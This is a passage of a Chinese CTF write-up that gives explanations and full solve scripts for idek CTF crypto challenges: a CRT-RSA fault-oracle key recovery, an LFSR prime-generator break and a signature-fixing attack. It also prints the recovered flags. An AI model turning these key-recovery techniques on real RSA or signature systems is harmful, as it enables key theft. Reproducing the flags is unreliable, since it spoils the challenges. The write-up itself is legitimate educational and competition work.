fac=[t,pow(t,2,n)]
H=[]
B=[]
for i in range(2):
    s.recvuntil(b'>>> ')
    s.sendline(b'1')
    s.recvuntil(b'Tell me the token. ')
    s.sendline(str(fac[i]).encode())
    s.recvuntil(b'What is your calculation? ')
    s.sendline(b'1')
    s.recvuntil(b'Nope, the ans is ')
    tmp=int(s.recvuntil(b'... (')[:-5].decode())
    bits=int(s.recvline()[:3].decode())
    H.append(tmp)
    B.append(bits)


P.<x,y>=PolynomialRing(Zmod(n))


f1=H[0]*10**B[0]+x
f2=H[1]*10**B[1]+y
f=f1^2-f2
roots=small_roots(f,(10**B[0],10**B[1]),m=4,d=4)[0]
roots=(roots[0],roots[1])
c1=roots[0]+H[0]*10**B[0]
c2=roots[1]+H[1]*10**B[1]
assert (c1^2-c2)%n==0

s.recvuntil(b'>>> ')
s.sendline(b'1')
s.recvuntil(b'Tell me the token. ')
s.sendline(str(t).encode())
s.recvuntil(b'What is your calculation? ')
s.sendline(str(c1).encode())
s.recvline()

s.recvuntil(b'>>> ')
s.sendline(b'2')
s.recvuntil(b'Give me the ticket. ')
s.sendline(str(c1).encode())
s.recvline()

s.recvuntil(b'>>> ')
s.sendline(b'3')
s.recvline()

#idek{St@rburst_str3@m!!!}
```

### Megalophobia:

题目模拟了把RSA私钥加密发送给用户再由用户上传的过程。这个过程中，虽然不能直接修改密钥为特定内容，但可以对d,u进行随机修改。同时服务端使用了CRT-RSA的方式进行解密并可以返回解密后的明文长度是否为128。考虑将u修改，则当明文小于q时可以正常解密，否则解密结果为随机值，有很大概率长度为128。这样就可以二分得到q从而恢复私钥。

```py
from pwn import *
from Crypto.Util.number import *

# context.log_level = "debug"
io = connect("megalophobia.chal.idek.team", 1337)

io.recvuntil(b"::\n|    ")
data = io.recvline().strip().decode()
pub, sec = data.split("::")
e = 0x10001

n = int(pub, 16)
sec = bytes.fromhex(sec)
print(f"{n = }")
print(sec)

u_len = 0x40
target_u_len = 0x39
u_len_pos = (2 + 64) * 2 + 2 + 128 + 1

sec = list(sec)
sec[u_len_pos] ^= target_u_len ^ u_len

sec = bytes(sec)

io.recvuntil(b"> (hex)")
io.sendline(sec.hex().encode())

l = 1 << 511
r = 2 * l -1

for i in range(500):
    io.recvuntil(b"|  > ")
    mid = (l+r)//2
    if i % 20 == 0:
        print(hex(mid))
    now = pow(mid, e, n)
    io.sendline(long_to_bytes(now).hex().encode())
    res = io.recvline()
    if b"Q_Q" in res:
        l = mid + 1
    else:
        r = mid 
print(f"{n = }")
print(f"{l = }")
print(f"{r = }")
print(f"{sec = }")
io.interactive()
```

### Primonumerophobia

这个题有一个 `1*47` 的随机变量 `s` ，`47*512` 的矩阵 $$mat_1, mat_2$$， 得到 $$s\times mat_1=p, s\times mat_2=q$$，然后把 `p, q` 当成二进制数，保证 `p, q` 都是质数，现在知道$$mat_1, mat_2, n=p\times q$$，求 `p, q`。所有运算都是在 `GF(2)` 下。
我们可以考虑枚举 `p` 的低 24 位，由于已知 `n` ，我们可以对应计算出若干个 `q` 的低 24 位，知道 48 位信息之后可以通过异或线性基的方式把 `p` 跟 `q` 的其余位都计算出来（因为每一个 bit 对应 `mat` 的一个列向量，列向量一共 47 维，所以只需要 47 个线性无关的列向量就能得到整个空间的一组基，其余的可以通过这组基异或得到）。

```py
d = 47
M = Matrix(GF(2),47,47)
taps = [47, 43, 41, 37, 31, 29, 23, 19, 17, 13, 11, 7, 5, 3, 2]
for _ in range(d - 1):
    M[_+1,_] = 1
for _ in taps:
    M[47-_,-1] = 1

# states = vector(GF(2),) 中间有个47bits的states，恢复出来即可
times1 = 1160
M_tmp = M**((times1-1)*512)
new_mat1 = Matrix(GF(2),d,512)
for i in range(512):
    for j in range(d):
        new_mat1[j,i] = M_tmp[j,0]
    M_tmp *= M

# 往后推q的关系，比如说输出是[LOG]447
times2 = 447
M_tmp = M_tmp * M**((times2-1)*512)
new_mat2 = Matrix(GF(2),d,512)
for i in range(512):
    for j in range(d):
        new_mat2[j,i] = M_tmp[j, 0]
    M_tmp *= M

for j in range(30):
    for i in range(d):
        print(new_mat1[i, j], end = " ")
    print()

with open("mat1.txt", "w") as f:
     for i in new_mat1.T:
         l = []
         for j in i:
             l.append(str(int(j)))
         f.write(" ".join(l)+"\n")

with open("mat2.txt", "w") as f:
     for i in new_mat2.T:
         l = []
         for j in i:
             l.append(str(int(j)))
         f.write(" ".join(l)+"\n")
```

```py
from Crypto.Util.number import *
import random

n = 78189483779073760819769596415493404181115737255987326126790953924148600157623709942134043192581448967829591214999561812461790206591977861764710056434977125005626712442593271233036617073503751799983263888626278748439349756982639988997517983470845431197233107232933125334078771472039280629203017666578936360521

last = []
binn = bin(n)[2:]
for i in range(24):
    x = binn[-(i + 1) : ]
    last.append(int(x, 2))

def dfs(p, cur, x):

    global ans

    if x == 24:
        ans.append((p[-1], int(cur, 2)))
        return

    _p = p[x]
    _n = last[x]

    t = "0" + "".join(cur)
    _q = int(t, 2)
    if ((_p * _q) & ((1 << (x+1)) - 1)) == _n:
        dfs(p, "0" + cur, x + 1)

    t = "1" + "".join(cur)
    _q = int(t, 2)
    if ((_p * _q) & ((1 << (x+1)) - 1)) == _n:
        dfs(p, "1" + cur, x + 1)

ans = []

for i in range(1 << 24):
    cur = ""
    p = []
    binp = bin(i)[2:]
    binp = ((24 - len(binp)) * "0") + binp
    for j in range(24):
        p.append(int(binp[-(j+1) : ], 2))
    dfs(p, cur, 0)

with open("pq.txt", "w") as f:
    for p, q in ans:
        f.write(str(p) + " " + str(q) + "\n")
```

```cpp
#include <set>
#include <map>
#include <cmath>
#include <cassert>
#include <queue>
#include <vector>
#include <cstdio>
#include <numeric>
#include <cstring>
#include <iostream>
#include <algorithm>
using namespace std;
using ll = long long;
using vint = vector<int>;
using namespace std;

inline int read() {
  int x = 0, f = 1; char ch = getchar();
  for (; ch < '0' || ch > '9'; ch = getchar()) if (ch == '-') f = -1;
  for (; ch >= '0' && ch <= '9'; ch = getchar()) x = x * 10 + ch - '0';
  return x * f;
}

int main() {
  FILE *f = fopen("pq.txt", "r");
  vector<ll> p(10000000), q(10000000);
  ll x, y;
  int n = 0;
  while (fscanf(f, "%lld%lld", &x, &y) != EOF) {
    p[n] = x;
    q[n] = y;
    ++n;
  }
  fclose(f);
  f = fopen("mat1.txt", "r");
  vector<ll> mat1(512), mat2(512);
  for (int i = 0; i < 512; i++) {
    ll x = 0;
    for (int j = 0; j < 47; j++) {
      ll bit;
      fscanf(f, "%lld", &bit);
      x |= bit << j;
    }
    mat1[i] = x;
  }
  fclose(f);
  f = fopen("mat2.txt", "r");
  for (int i = 0; i < 512; i++) {
    ll x = 0;
    for (int j = 0; j < 47; j++) {
      ll bit;
      fscanf(f, "%lld", &bit);
      x |= bit << j;
    }
    mat2[i] = x;
  }
  fclose(f);
  reverse(mat1.begin(), mat1.end());
  reverse(mat2.begin(), mat2.end());
  vector<ll> l;
  vector<pair<ll, ll>> B;
  for (int i = 0; i < 23; i++)
    l.push_back(mat1[i]);
  for (int i = 0; i < 24; i++)
    l.push_back(mat2[i]);
  for (int i = 0; i < 47; i++) {
    ll x = l[i];
    ll p = 1ll << i;
    for (auto num : B) {
      ll y = num.first, pos = num.second;
      if ((y ^ x) < x) {
        x ^= y;
        p ^= pos;
      }
    }
    for (auto &num : B) {
      ll y = num.first;
      if ((y ^ x) < y) {
        num.first ^= x;
        num.second ^= p;
      }
    }
    assert(x);
    B.push_back(make_pair(x, p));
  }
  vector<vector<int>> posp(512, vector<int>()), posq(512, vector<int>());
  for (int i = 0; i < 512; i++) {
    ll x = mat1[i];
    ll p = 0;
    for (int j = 0; j < 47; j++)
      if (x & B[j].first)
        p ^= B[j].second;
    for (int j = 0; j < 47; j++)
      if ((p >> j) & 1)
        posp[i].push_back(j);
    ll check = 0;
    for (int x : posp[i])
      check ^= l[x];
    assert(check == x);
  }
  for (int i = 0; i < 512; i++) {
    ll x = mat2[i];
    ll p = 0;
    for (int j = 0; j < 47; j++)
      if (x & B[j].first)
        p ^= B[j].second;
    for (int j = 0; j < 47; j++)
      if ((p >> j) & 1)
        posq[i].push_back(j);
    ll check = 0;
    for (int x : posq[i])
      check ^= l[x];
    assert(check == x);
  }

  // this file could be 8.6G big!
  f = fopen("real_pq.txt", "w");
  vector<int> _l(47);

  for (int i = 0; i < n; i++) {
    ll _p = p[i], _q = q[i];
    if (i % 100000 == 0)
      printf("%d\n", i);

    for (int j = 0; j < 23; j++)
      _l[j] = (_p >> j) & 1;
    for (int j = 0; j < 24; j++)
      _l[j + 23] = (_q >> j) & 1;
    for (int i = 511; i >= 0; i--) {
      int bit_p = 0;
      for (ll x : posp[i]) {
        bit_p ^= _l[x];
      }
      fprintf(f, "%c", '0' + bit_p);
      if (i < 23) {
        assert(bit_p == _l[i]);
      }
    }
    fprintf(f, " ");
    for (int i = 511; i >= 0; i--) {
      int bit_q = 0;
      for (ll x : posq[i])
        bit_q ^= _l[x];
      fprintf(f, "%c", '0' + bit_q);
      if (i < 24) {
        assert(bit_q == _l[i + 23]);
      }
    }
    fprintf(f, "\n");
  }
  fclose(f);
  return 0;
}
```

```py
p = 8148641146281585626599965707019875487540363795516672614500530970713004312213378852992447549855928600229171345524388095399807768385341698813126095446000969
q = 9595401536948702154260950703331322993513137152314157248261000347717193558940157103084976690783331034882701052399602064548436624663369151807143327408382209
enc = 39952631182502523101053953538875437560829302998610236142339435591980522271590392249355510253125310494063081880512061476177621613835835483055753316172267380484804011034657479491794064534740537749793563744927827732170347495398050941609682485707331552759412916426691849669362897656967530464847648838434750188588
phi = (p-1) * (q-1)
from Crypto.Util.number import *
e = inverse(0x10001, phi)
m = pow(enc, e, p*q)
print(long_to_bytes(m))
# b'idek{th3_prim3_g3n3r4ti0n_is_c001_but_n0t_s3cur3_QAQ}\n'
```

### Psychophobia:

s大概会差`O//8`的k倍(k<8)，修复后的si，发现`GCD(si, O)==4`或者`GCD(si, O)==8`都是唯一的，能够通过的s都是二者之一，并且这两个数的i存在`i2-i1=4`,即存在`(0,4),(1,5),(2,6),(3,7)`这几种选择可能(例如k=1时如果GCD(s1,O)==4,那么GCD(s5,O)==8)。那么分析`k=0，GCD(s0, O)==4`，`k=4, GCD(s4, O)==8`的频率，以此类推k=1..8，gcd=4,8。再分析对应i和gcd情况下的选择（0可以排除掉，对应的一定选4，例如将）。该题目中测试结果为当`GCD(s1, O)==4`时大概率s1为正确解，当`GCD(s1, O)==8`时大概率s5为正确解。当`GCD(s2, O)==4`时大概率s6为正确解，当`GCD(s2, O)==8`时大概率s2为正确解。当`GCD(s3, O)==4`时大概率s3为正确解，当`GCD(s3, O)==8`时大概率s7为正确解。大概有70%的概率fix正确，多跑几次即可。

```py
from hashlib import sha256
from netcat import *
from Crypto.Util.number import *
from ast import literal_eval

def fix(r, s):
    rs = 0
    idx = []
    gcds = []
    for i in range(8):
        si = (s + i * (O // 8)) % O
        u1 = (h * inverse(si, O)) % O
        u2 = (r * inverse(si, O)) % O
        if GCD(si, O) == 4 or GCD(si, O) == 8:
            idx.append(i)
            gcds.append(GCD(si, O))
    if idx[0] == 0:
        x = idx[1]
    elif idx[0] == 1:
        if gcds[0] == 4:
            x = idx[0]
        else:
            x = idx[1]
    elif idx[0] == 2:
        if gcds[0] == 4:
            x = idx[1]
        else:
            x = idx[0]
    elif idx[0] == 3:
        if gcds[0] == 4:
            x = idx[0]
        else:
            x = idx[1]
    fix_s = (s + x * (O // 8)) % O
    return fix_s

P = 2**255 - 19
A = 486662
B = 1
# Order of the Curve
O = 57896044618658097711785492504343953926856930875039260848015607506283634007912

while True:
    host, port = 'psychophobia.chal.idek.team 1337'.split(' ')
    io = remote(host, int(port))
    io.recvuntil(b"|    > ")
    io.sendline(b"1")
    msg = "1 here, requesting flag for pick-up."
    h = int.from_bytes(sha256(msg.encode()).digest(), 'big')
    for round in range(500):
        print(f"round-{round}")
        io.recvuntil(b'Please fix :: ')
        tmp = io.recvline()
        sig = literal_eval(tmp.strip().decode())
        r, s = sig
        fix_s = fix(r, s)
        io.recvuntil(b'|    > (r,s) ')
        io.sendline(f'{r},{fix_s}'.encode())

    io.recvuntil(b"signatures!\n")
    io.recvline()
    tmp = io.recvline()
    print(tmp)
    if b"{" in tmp:
        print("get flag!")
        io.close()
        input()
    else:
        io.close()
```

## 结语

剩下的三个web和四个密码之后我们会复现整理后再推出相关的文章与大家一起交流学习.敬请期待,如果有什么问题欢迎发邮件询问


